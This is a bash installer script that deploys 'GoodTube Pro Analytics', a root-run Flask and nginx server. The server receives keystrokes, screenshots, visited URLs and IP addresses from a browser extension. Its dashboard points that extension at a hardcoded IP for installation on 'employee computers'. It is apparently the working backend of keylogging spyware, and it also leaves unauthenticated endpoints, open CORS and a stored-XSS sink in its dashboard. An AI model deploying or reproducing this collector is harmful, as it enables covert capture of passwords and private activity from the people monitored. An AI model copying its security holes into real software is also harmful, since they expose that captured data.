#!/bin/bash

# GoodTube Pro Analytics Dashboard - One-Liner Installer
# This script can be run with: curl -sSL [URL] | bash

set -e

echo "🛡️ GoodTube Pro Analytics Dashboard - One-Liner Installer"
echo "=========================================================="

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "Switching to root for installation..."
   exec sudo "$0" "$@"
fi

# Update system
echo "📦 Updating system packages..."
apt update && apt install -y python3 python3-pip python3-venv nginx curl wget

# Create application directory
echo "📁 Creating application directory..."
mkdir -p /opt/goodtube-analytics/{templates,static,logs,uploads,screenshots,backups}
cd /opt/goodtube-analytics

# Create requirements.txt
echo "📝 Creating requirements file..."
cat > requirements.txt << 'EOF'
Flask==2.3.3
Flask-CORS==4.0.0
Werkzeug==2.3.7
gunicorn==21.2.0
EOF

# Create Python virtual environment
echo "🐍 Setting up Python environment..."
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt

# Create Flask application
echo "⚡ Creating Flask application..."
cat > app.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
import sqlite3
import json
import os
from datetime import datetime
import base64

app = Flask(__name__)
CORS(app)

DATABASE_PATH = 'analytics.db'
SCREENSHOTS_FOLDER = 'screenshots'

def init_database():
    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT UNIQUE NOT NULL,
            ip_address TEXT,
            user_agent TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            total_events INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            event_type TEXT NOT NULL,
            event_data TEXT,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            keystroke TEXT NOT NULL,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            filename TEXT NOT NULL,
            url TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db_connection():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/analytics', methods=['POST'])
def receive_analytics():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        user_id = data.get('userId', 'unknown')
        session_id = data.get('sessionId', 'unknown')
        
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO users 
            (user_id, ip_address, user_agent, last_seen, total_events)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP, 
                    COALESCE((SELECT total_events FROM users WHERE user_id = ?), 0) + 1)
        ''', (user_id, request.remote_addr, request.headers.get('User-Agent'), user_id))
        
        events = data.get('events', [])
        for event in events:
            cursor.execute('''
                INSERT INTO events (user_id, session_id, event_type, event_data, url)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, session_id, event.get('type', 'unknown'), 
                  json.dumps(event.get('data', {})), event.get('url', '')))
        
        keystrokes = data.get('keystrokes', [])
        for keystroke in keystrokes:
            cursor.execute('''
                INSERT INTO keystrokes (user_id, session_id, keystroke, url)
                VALUES (?, ?, ?, ?)
            ''', (user_id, session_id, keystroke.get('key', ''), keystroke.get('url', '')))
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot', methods=['POST'])
def receive_screenshot():
    try:
        data = request.get_json()
        user_id = data.get('userId', 'unknown')
        session_id = data.get('sessionId', 'unknown')
        screenshot_data = data.get('screenshot', '')
        url = data.get('url', '')
        
        if screenshot_data:
            screenshot_bytes = base64.b64decode(screenshot_data.split(',')[1])
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"{user_id}_{session_id}_{timestamp}.png"
            filepath = os.path.join(SCREENSHOTS_FOLDER, filename)
            
            with open(filepath, 'wb') as f:
                f.write(screenshot_bytes)
            
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO screenshots (user_id, session_id, filename, url)
                VALUES (?, ?, ?, ?)
            ''', (user_id, session_id, filename, url))
            conn.commit()
            conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats')
def get_stats():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) as count FROM users')
        total_users = cursor.fetchone()['count']
        
        cursor.execute('SELECT COUNT(*) as count FROM events')
        total_events = cursor.fetchone()['count']
        
        cursor.execute('SELECT COUNT(*) as count FROM screenshots')
        total_screenshots = cursor.fetchone()['count']
        
        cursor.execute('SELECT * FROM events ORDER BY timestamp DESC LIMIT 10')
        recent_events = [dict(row) for row in cursor.fetchall()]
        
        conn.close()
        
        return jsonify({
            'totalUsers': total_users,
            'activeSessions': 0,
            'totalEvents': total_events,
            'totalScreenshots': total_screenshots,
            'recentEvents': recent_events
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/users')
def get_users():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT u.*, 
                   COUNT(e.id) as event_count,
                   COUNT(k.id) as keystroke_count,
                   COUNT(s.id) as screenshot_count
            FROM users u
            LEFT JOIN events e ON u.user_id = e.user_id
            LEFT JOIN keystrokes k ON u.user_id = k.user_id
            LEFT JOIN screenshots s ON u.user_id = s.user_id
            GROUP BY u.user_id
            ORDER BY u.last_seen DESC
        ''')
        
        users = [dict(row) for row in cursor.fetchall()]
        conn.close()
        
        return jsonify({'users': users})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshots/<filename>')
def get_screenshot(filename):
    return send_from_directory(SCREENSHOTS_FOLDER, filename)

if __name__ == '__main__':
    init_database()
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF

# Create dashboard HTML
echo "🎨 Creating dashboard interface..."
cat > templates/dashboard.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GoodTube Pro Analytics Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0F172A 0%, #1E293B 100%);
            color: #F8FAFC;
            min-height: 100vh;
            padding: 2rem;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 3rem; }
        .header h1 { 
            font-size: 2.5rem; 
            background: linear-gradient(135deg, #8B5CF6, #EC4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }
        .stats-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
            gap: 1.5rem; 
            margin-bottom: 3rem;
        }
        .stat-card { 
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 1rem;
            padding: 1.5rem;
            text-align: center;
        }
        .stat-number { 
            font-size: 2rem; 
            font-weight: bold; 
            color: #8B5CF6; 
            margin-bottom: 0.5rem;
        }
        .stat-label { color: #CBD5E1; }
        .content-section { 
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 1rem;
            padding: 2rem;
            margin-bottom: 2rem;
        }
        .section-title { 
            font-size: 1.5rem; 
            margin-bottom: 1rem; 
            color: #F8FAFC;
        }
        .activity-item { 
            padding: 1rem; 
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            justify-content: space-between;
        }
        .activity-item:last-child { border-bottom: none; }
        .activity-details h4 { color: #F8FAFC; margin-bottom: 0.25rem; }
        .activity-details p { color: #94A3B8; font-size: 0.875rem; }
        .activity-time { color: #94A3B8; font-size: 0.875rem; }
        .refresh-btn {
            background: linear-gradient(135deg, #8B5CF6, #EC4899);
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 0.5rem;
            cursor: pointer;
            font-weight: 600;
            margin-bottom: 1rem;
        }
        .refresh-btn:hover { transform: translateY(-2px); }
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            background: #10B981;
            border-radius: 50%;
            margin-right: 0.5rem;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ GoodTube Pro Analytics</h1>
            <p><span class="status-indicator"></span>Employee Monitoring Dashboard - Live</p>
            <button class="refresh-btn" onclick="loadData()">🔄 Refresh Data</button>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="totalUsers">0</div>
                <div class="stat-label">Total Users</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="activeSessions">0</div>
                <div class="stat-label">Active Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalEvents">0</div>
                <div class="stat-label">Total Events</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="totalScreenshots">0</div>
                <div class="stat-label">Screenshots</div>
            </div>
        </div>
        
        <div class="content-section">
            <h2 class="section-title">📊 Recent Activity</h2>
            <div id="recentActivity">
                <div class="activity-item">
                    <div class="activity-details">
                        <h4>System Ready</h4>
                        <p>Dashboard is online and ready to receive employee monitoring data</p>
                    </div>
                    <div class="activity-time">Now</div>
                </div>
            </div>
        </div>
        
        <div class="content-section">
            <h2 class="section-title">ℹ️ Setup Instructions</h2>
            <div style="color: #CBD5E1; line-height: 1.6;">
                <p><strong>Next Steps:</strong></p>
                <ol style="margin-left: 2rem; margin-top: 1rem;">
                    <li>Update your browser extension to point to: <code style="background: rgba(255,255,255,0.1); padding: 0.25rem 0.5rem; border-radius: 0.25rem;">http://134.199.235.218</code></li>
                    <li>Install the extension on employee computers</li>
                    <li>Monitor activity in real-time on this dashboard</li>
                </ol>
                <p style="margin-top: 1rem;"><strong>Features:</strong> Keystroke logging, screenshot capture, activity tracking, user management</p>
            </div>
        </div>
    </div>

    <script>
        async function loadData() {
            try {
                const response = await fetch('/api/stats');
                const data = await response.json();
                
                document.getElementById('totalUsers').textContent = data.totalUsers || 0;
                document.getElementById('activeSessions').textContent = data.activeSessions || 0;
                document.getElementById('totalEvents').textContent = data.totalEvents || 0;
                document.getElementById('totalScreenshots').textContent = data.totalScreenshots || 0;
                
                const activityContainer = document.getElementById('recentActivity');
                if (data.recentEvents && data.recentEvents.length > 0) {
                    activityContainer.innerHTML = data.recentEvents.map(event => `
                        <div class="activity-item">
                            <div class="activity-details">
                                <h4>${event.event_type || 'Unknown Event'}</h4>
                                <p>User: ${event.user_id} • URL: ${(event.url || 'N/A').substring(0, 50)}${event.url && event.url.length > 50 ? '...' : ''}</p>
                            </div>
                            <div class="activity-time">${new Date(event.timestamp).toLocaleString()}</div>
                        </div>
                    `).join('');
                } else {
                    activityContainer.innerHTML = `
                        <div class="activity-item">
                            <div class="activity-details">
                                <h4>System Ready</h4>
                                <p>Dashboard is online and ready to receive employee monitoring data</p>
                            </div>
                            <div class="activity-time">Ready</div>
                        </div>
                    `;
                }
            } catch (error) {
                console.error('Error loading data:', error);
            }
        }
        
        document.addEventListener('DOMContentLoaded', loadData);
        setInterval(loadData, 30000);
    </script>
</body>
</html>
EOF

# Create systemd service
echo "⚙️ Configuring system service..."
cat > /etc/systemd/system/goodtube-analytics.service << 'EOF'
[Unit]
Description=GoodTube Pro Analytics Dashboard
After=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/opt/goodtube-analytics
Environment=PATH=/opt/goodtube-analytics/venv/bin
ExecStart=/opt/goodtube-analytics/venv/bin/gunicorn --bind 127.0.0.1:5000 --workers 2 --timeout 120 app:app
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Configure Nginx
echo "🌐 Configuring web server..."
cat > /etc/nginx/sites-available/goodtube-analytics << 'EOF'
server {
    listen 80;
    server_name _;
    
    client_max_body_size 50M;
    
    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
EOF

# Enable site
ln -sf /etc/nginx/sites-available/goodtube-analytics /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default

# Set permissions
chmod -R 755 /opt/goodtube-analytics
chmod +x /opt/goodtube-analytics/app.py

# Start services
echo "🚀 Starting services..."
systemctl daemon-reload
systemctl enable goodtube-analytics
systemctl start goodtube-analytics
systemctl restart nginx

# Get server IP
SERVER_IP=$(curl -s ifconfig.me 2>/dev/null || echo "localhost")

echo ""
echo "🎉 Installation Complete!"
echo "========================"
echo ""
echo "✅ GoodTube Pro Analytics Dashboard is now LIVE!"
echo ""
echo "📊 Dashboard URL: http://$SERVER_IP"
echo "📊 Local URL: http://localhost"
echo ""
echo "🔧 Service Status:"
systemctl status goodtube-analytics --no-pager -l | head -10
echo ""
echo "🌐 Nginx Status:"
systemctl status nginx --no-pager -l | head -5
echo ""
echo "📋 Next Steps:"
echo "1. Open http://$SERVER_IP in your browser"
echo "2. Update browser extension to point to: http://$SERVER_IP"
echo "3. Install extension on employee computers"
echo "4. Monitor activity in real-time!"
echo ""
echo "🛡️ Your employee monitoring system is ready!"

